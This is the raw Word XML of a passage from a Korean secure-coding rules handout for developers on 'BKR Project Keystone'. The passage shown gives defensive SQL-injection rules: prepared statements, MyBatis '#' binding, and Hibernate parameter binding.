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F7CB4" w:rsidRPr="009419B0" w:rsidRDefault="00CF7CB4" w:rsidP="00CF7CB4">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Pretendard Variable Medium" w:eastAsia="Pretendard Variable Medium" w:hAnsi="Pretendard Variable Medium"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF7CB4" w:rsidRPr="009419B0" w:rsidRDefault="00CF7CB4" w:rsidP="00CF7CB4">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Pretendard Variable Medium" w:eastAsia="Pretendard Variable Medium" w:hAnsi="Pretendard Variable Medium"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Pretendard Variable Medium" w:eastAsia="Pretendard Variable Medium" w:hAnsi="Pretendard Variable Medium"/>
          <w:noProof/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="1181100" cy="352425"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:docPr id="2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81100" cy="352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F7CB4" w:rsidRPr="009419B0" w:rsidRDefault="00CF7CB4" w:rsidP="00CF7CB4">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:rPr>
          <w:rFonts w:ascii="Pretendard Variable Medium" w:eastAsia="Pretendard Variable Medium" w:hAnsi="Pretendard Variable Medium"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Pretendard Variable Medium" w:eastAsia="Pretendard Variable Medium" w:hAnsi="Pretendard Variable Medium" w:hint="eastAsia"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>BKR Project Keystone</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF7CB4" w:rsidRPr="009419B0" w:rsidRDefault="00CF7CB4" w:rsidP="00CF7CB4">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Pretendard Variable Medium" w:eastAsia="Pretendard Variable Medium" w:hAnsi="Pretendard Variable Medium"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF7CB4" w:rsidRPr="009419B0" w:rsidRDefault="00CF7CB4" w:rsidP="00CF7CB4">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Pretendard Variable Medium" w:eastAsia="Pretendard Variable Medium" w:hAnsi="Pretendard Variable Medium"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Pretendard Variable Medium" w:eastAsia="Pretendard Variable Medium" w:hAnsi="Pretendard Variable Medium"/>
          <w:noProof/>
          <w:lang w:eastAsia="ko-K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457200</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>114300</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="4572000" cy="0"/>
                <wp:effectExtent l="33655" t="33655" r="33020" b="33020"/>
                <wp:wrapNone/>
                <wp:docPr id="4" name="직선 연결선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572000" cy="0"/>
                        </a:xfrm>
                        <a:prstGeom prst="line">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="57150" cmpd="thickThin">
                          <a:solidFill>
                            <a:srgbClr val="969696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BF00EFA" id="직선 연결선 4" o:spid="_x0000_s1026" style="position:absolute;left:0;text-align:lef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6pt,9pt" to="396pt,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" strokecolor="#969696" strokeweight="4.5pt">
                <v:stroke linestyle="thickThin"/>
              </v:line>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF7CB4" w:rsidRDefault="00CF7CB4" w:rsidP="00CF7CB4">
      <w:pPr>
        <w:pStyle w:val="aff2"/>
        <w:rPr>
          <w:rFonts w:ascii="Pretendard Variable Light" w:eastAsia="Pretendard Variable Light" w:hAnsi="Pretendard Variable Light"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Pretendard Variable Light" w:eastAsia="Pretendard Variable Light" w:hAnsi="Pretendard Variable Light" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
        </w:rPr>
        <w:t>시큐어 코딩 준수 규칙</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00284488" w:rsidRDefault="00284488" w:rsidP="00CF7CB4">
      <w:pPr>
        <w:pStyle w:val="aff2"/>
        <w:rPr>
          <w:rFonts w:ascii="Pretendard Variable Light" w:eastAsia="Pretendard Variable Light" w:hAnsi="Pretendard Variable Light"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Pretendard Variable Light" w:eastAsia="Pretendard Variable Light" w:hAnsi="Pretendard Variable Light" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
        </w:rPr>
        <w:t>-개발자 배포용</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF7CB4" w:rsidRPr="009419B0" w:rsidRDefault="00CF7CB4" w:rsidP="00CF7CB4">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Pretendard Variable Medium" w:eastAsia="Pretendard Variable Medium" w:hAnsi="Pretendard Variable Medium"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Pretendard Variable Medium" w:eastAsia="Pretendard Variable Medium" w:hAnsi="Pretendard Variable Medium"/>
          <w:noProof/>
          <w:lang w:eastAsia="ko-KR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457200</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>114300</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="4572000" cy="0"/>
                <wp:effectExtent l="33655" t="33655" r="33020" b="33020"/>
                <wp:wrapNone/>
                <wp:docPr id="3" name="직선 연결선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572000" cy="0"/>
                        </a:xfrm>
                        <a:prstGeom prst="line">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="57150" cmpd="thinThick">
                          <a:solidFill>
                            <a:srgbClr val="969696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65C517B" id="직선 연결선 3" o:spid="_x0000_s1026" style="position:absolute;left:0;text-align:lef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6pt,9pt" to="396pt,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" strokecolor="#969696" strokeweight="4.5pt">
                <v:stroke linestyle="thinThick"/>
              </v:line>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF7CB4" w:rsidRPr="009419B0" w:rsidRDefault="00CF7CB4" w:rsidP="00CF7CB4">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Pretendard Variable Medium" w:eastAsia="Pretendard Variable Medium" w:hAnsi="Pretendard Variable Medium"/>
          <w:sz w:val="20"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF7CB4" w:rsidRPr="009419B0" w:rsidRDefault="00CF7CB4" w:rsidP="00CF7CB4">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Pretendard Variable Medium" w:eastAsia="Pretendard Variable Medium" w:hAnsi="Pretendard Variable Medium"/>
          <w:sz w:val="20"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF7CB4" w:rsidRPr="009419B0" w:rsidRDefault="00CF7CB4" w:rsidP="00CF7CB4">
      <w:pPr>
        <w:pStyle w:val="20pt"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Pretendard Variable Medium" w:eastAsia="Pretendard Variable Medium" w:hAnsi="Pretendard Variable Medium"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:sz w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF7CB4" w:rsidRPr="009419B0" w:rsidRDefault="00CF7CB4" w:rsidP="00CF7CB4">
      <w:pPr>
        <w:pStyle w:val="aff1"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="332" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Pretendard Variable Medium" w:eastAsia="Pretendard Variable Medium" w:hAnsi="Pretendard Variable Medium"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF7CB4" w:rsidRPr="009419B0" w:rsidRDefault="00CF7CB4" w:rsidP="00CF7CB4">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Pretendard Variable Medium" w:eastAsia="Pretendard Variable Medium" w:hAnsi="Pretendard Variable Medium"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF7CB4" w:rsidRPr="009419B0" w:rsidRDefault="00CF7CB4" w:rsidP="00CF7CB4">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Pretendard Variable Medium" w:eastAsia="Pretendard Variable Medium" w:hAnsi="Pretendard Variable Medium"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF7CB4" w:rsidRPr="009419B0" w:rsidRDefault="00CF7CB4" w:rsidP="00CF7CB4">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Pretendard Variable Medium" w:eastAsia="Pretendard Variable Medium" w:hAnsi="Pretendard Variable Medium"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF7CB4" w:rsidRDefault="00CF7CB4" w:rsidP="00CF7CB4">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Pretendard Variable Medium" w:eastAsia="Pretendard Variable Medium" w:hAnsi="Pretendard Variable Medium"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF7CB4" w:rsidRPr="009419B0" w:rsidRDefault="00CF7CB4" w:rsidP="00CF7CB4">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Pretendard Variable Medium" w:eastAsia="Pretendard Variable Medium" w:hAnsi="Pretendard Variable Medium"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF7CB4" w:rsidRDefault="00CF7CB4" w:rsidP="00CF7CB4">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Pretendard Variable Medium" w:eastAsia="Pretendard Variable Medium" w:hAnsi="Pretendard Variable Medium"/>
          <w:noProof/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF7CB4" w:rsidRDefault="00CF7CB4">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:b/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="36"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF7CB4" w:rsidRDefault="00CF7CB4">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:b/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="36"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Pretendard Variable Medium" w:eastAsia="Pretendard Variable Medium" w:hAnsi="Pretendard Variable Medium"/>
          <w:noProof/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6C23A00A" wp14:editId="2DBF8503">
            <wp:extent cx="533400" cy="533400"/>
            <wp:effectExtent l="0" t="0" r="0" b="0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" cy="533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F7CB4" w:rsidRDefault="00CF7CB4">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:b/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="36"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF7CB4" w:rsidRDefault="00CF7CB4">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:b/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="36"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF7CB4" w:rsidRDefault="00CF7CB4" w:rsidP="00CF7CB4">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="맑은 고딕" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:color w:val="auto"/>
          <w:spacing w:val="0"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF7CB4" w:rsidRPr="00CF7CB4" w:rsidRDefault="00CF7CB4" w:rsidP="00CF7CB4">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="36"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>시큐어</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="36"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="36"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>코딩</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="36"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="36"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>준수</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="36"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="36"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>규칙</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="36"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="36"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>요약</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>본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문서는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「소프트웨어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개발보안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가이드</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">(2021.12.29, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>행정안전부</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>」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제</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>장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구현단계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시큐어코딩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가이드에서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실제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코딩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시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반드시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준수해야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할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보안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규칙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및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예제를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발췌</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>·</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>정리한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것입니다</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>제</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>절</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>입력데이터</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>검증</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>및</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>표현</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B30C6E" w:rsidRPr="00B45AFB" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">  1. SQL </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>삽입</w:t>
      </w:r>
      <w:r w:rsidR="00B45AFB">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00B45AFB">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">– </w:t>
      </w:r>
      <w:r w:rsidR="00DD0E36">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r w:rsidR="00B45AFB">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>인젝션</w:t>
      </w:r>
      <w:r w:rsidR="00B45AFB">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00B45AFB">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>공격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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>• PreparedStatement</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>를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사용하여</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> DB</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>에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컴파일된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쿼리문</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>상수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>을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전달한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• MyBatis </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사용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시</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> $ </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>대신</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> # </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>기호를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사용하여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파라미터를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바인딩한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• Hibernate </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사용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시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파라미터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바인딩</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">(?, :name) </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>없이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외부값을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직접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쿼리에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연결하지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않는다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
